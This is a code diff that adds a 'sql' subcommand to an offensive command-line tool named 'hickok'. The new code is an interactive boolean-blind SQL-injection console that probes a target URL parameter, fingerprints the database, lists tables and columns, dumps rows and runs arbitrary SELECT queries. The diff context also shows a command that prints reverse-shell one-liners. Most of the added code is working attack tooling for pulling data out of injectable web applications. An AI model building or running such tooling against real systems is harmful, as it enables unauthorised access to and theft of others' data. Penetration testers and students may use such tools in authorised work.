@@ -4,9 +4,11 @@ from __future__ import annotations
 
 import argparse
 import asyncio
+import re
 import sys
+from urllib.parse import parse_qs, urlsplit
 
-from hickok import __version__, findings, payloads
+from hickok import __version__, findings, payloads, sqli
 from hickok.console import DIM, THEMES, Console
 from hickok.handler import ShellServer
 
@@ -18,7 +20,7 @@ examples:
   hickok payloads 10.10.14.7 9001        print reverse-shell one-liners
 """
 
-_COMMANDS = {"listen", "hand", "payloads", "eights"}
+_COMMANDS = {"listen", "hand", "payloads", "eights", "sql"}
 
 
 class _Help(argparse.RawDescriptionHelpFormatter):
@@ -114,6 +116,129 @@ def cmd_eights(args) -> None:
     _console(args).eights()
 
 
+_SQL_HELP = """  walk the database (boolean-blind):
+  banner                DBMS version       user / db        current user / database
+  tables                list tables        columns <table>  list a table's columns
+  dump <table>          dump its rows      query "<SELECT>"  extract one value
+  help                  this               exit             quit
+"""
+
+
+def _sqli_target(items):
+    """Pull (url, param) from a wraith SQL-injection finding, if any."""
+    for f in items:
+        title = (f.get("title") or "")
+        if "sql injection" in title.lower():
+            m = re.search(r"in '([^']+)'", title)
+            if m and f.get("target"):
+                return f["target"], m.group(1)
+    return None, None
+
+
+def cmd_sql(args) -> None:
+    c = _console(args)
+    c.banner()
+    url, param, value = args.url, args.param, args.value
+    if not url:                                  # fall back to wraith's latest run
+        path = findings.latest()
+        items = findings.load(path) if path else []
+        t, p = _sqli_target(items)
+        if t:
+            url, param = t, (param or p)
+            c.info(f"target from wraith: {p} @ {t}")
+    if not url:
+        c.bad("need a target — `hickok sql -u 'http://host/page?id=1' [-p id]`")
+        raise SystemExit(2)
+
+    q = parse_qs(urlsplit(url).query)
+    if not param:
+        if len(q) == 1:
+            param = next(iter(q))
+        else:
+            c.bad("which parameter? add `-p <name>`")
+            raise SystemExit(2)
+    if param in q and args.value == "1":         # take the URL's own value unless overridden
+        value = q[param][0]
+
+    p = urlsplit(url)
+    c.info(f"injecting '{param}' at {p.scheme}://{p.netloc}{p.path}")
+    c.info("calibrating boolean-blind oracle…")
+    oracle = sqli.calibrate(url, param, value)
+    if oracle is None:
+        c.bad("no boolean-blind injection here — try another parameter or value")
+        raise SystemExit(1)
+    c.good(f"injectable — {oracle.context} context")
+    dbms = sqli.fingerprint(oracle)
+    prof = sqli._PROFILES.get(dbms, sqli._PROFILES["sqlite"])
+    c.good(f"DBMS: {dbms}")
+    _sql_repl(c, oracle, prof)
+
+
+def _print_table(c, cols, rows) -> None:
+    widths = [max(len(cols[i]), *(len(r[i]) for r in rows)) if rows else len(cols[i])
+              for i in range(len(cols))]
+    c.plain("  " + c._c(DIM, " | ".join(h.ljust(widths[i]) for i, h in enumerate(cols))))
+    c.plain("  " + c._c(DIM, "-+-".join("-" * w for w in widths)))
+    for r in rows:
+        c.plain("  " + " | ".join(v.ljust(widths[i]) for i, v in enumerate(r)))
+
+
+def _sql_repl(c, oracle, prof) -> None:
+    c.plain(_SQL_HELP)
+    while True:
+        try:
+            line = input("hickok(sql)> ").strip()
+        except (EOFError, KeyboardInterrupt):
+            c.plain("")
+            break
+        if not line:
+            continue
+        cmd, _, arg = line.partition(" ")
+        cmd, arg = cmd.lower(), arg.strip()
+        before = oracle.count
+        try:
+            if cmd in ("exit", "quit"):
+                break
+            elif cmd in ("help", "?"):
+                c.plain(_SQL_HELP)
+                continue
+            elif cmd == "banner":
+                c.good(sqli.extract_str(oracle, prof, prof["version"]))
+            elif cmd in ("user", "current-user"):
+                c.good(sqli.extract_str(oracle, prof, prof["user"]) or "(n/a)")
+            elif cmd in ("db", "current-db"):
+                c.good(sqli.extract_str(oracle, prof, prof["db"]))
+            elif cmd == "tables":
+                for t in sqli.tables(oracle, prof):
+                    c.plain(f"  {t}")
+            elif cmd == "columns":
+                if not arg:
+                    c.warn("usage: columns <table>")
+                    continue
+                for col in sqli.columns(oracle, prof, arg):
+                    c.plain(f"  {col}")
+            elif cmd == "dump":
+                if not arg:
+                    c.warn("usage: dump <table>")
+                    continue
+                cols = sqli.columns(oracle, prof, arg)
+                rows = sqli.dump(oracle, prof, arg, cols)
+                _print_table(c, cols, rows)
+            elif cmd == "query":
+                if not arg:
+                    c.warn('usage: query "<SELECT returning one value>"')
+                    continue
+                if len(arg) >= 2 and arg[0] == arg[-1] and arg[0] in "\"'":
+                    arg = arg[1:-1]            # peel one wrapping quote, keep inner ones
+                c.good(sqli.extract_str(oracle, prof, arg))
+            else:
+                c.warn(f"unknown command: {cmd} (type 'help')")
+        except Exception as exc:
+            c.bad(f"error: {exc}")
+        c.plain(c._c(DIM, f"      {oracle.count - before} requests · {oracle.count} total"))
+
+
+
 def _output_options() -> argparse.ArgumentParser:
     """Cosmetic options every command understands, shared via parents= so they
     work in any position (`hickok hand f.json --no-color`, not only before it)."""
@@ -150,6 +275,13 @@ def build_parser() -> argparse.ArgumentParser:
     hd.add_argument("file", nargs="?",
                     help="path to a wraith findings.json (default: wraith's latest run, $WRAITH_RUNS-aware)")
     hd.set_defaults(func=cmd_hand)
+
+    sq = sub.add_parser("sql", help="walk a SQL-injectable parameter (boolean-blind)",
+                        formatter_class=_Help, parents=[common])
+    sq.add_argument("-u", "--url", help="target URL (default: wraith's latest SQLi finding)")
+    sq.add_argument("-p", "--param", help="injectable parameter (inferred if the URL has just one)")
+    sq.add_argument("--value", metavar="V", default="1", help="a normal value for the parameter (default: 1)")
+    sq.set_defaults(func=cmd_sql)
 
     pl = sub.add_parser("payloads", help="print reverse-shell one-liners",
                         formatter_class=_Help, parents=[common])
